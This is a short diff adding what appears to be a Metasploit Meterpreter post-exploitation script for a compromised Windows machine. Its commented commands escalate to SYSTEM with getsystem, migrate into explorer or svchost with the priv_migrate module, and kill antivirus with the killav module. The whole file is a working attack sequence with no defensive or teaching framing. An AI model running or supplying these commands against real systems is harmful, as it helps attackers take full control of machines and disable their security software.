@@ -1,0 +1,9 @@
+#this command will try to get the system right from the local machine
+getsystem -t 4
+
+#this will migrate the process to the explorer process if getsystem does not work
+#else it will try to migrate to a system process like svchost
+run post/windows/manage/priv_migrate
+
+# this command will try to kill the av
+run post/windows/manage/killav
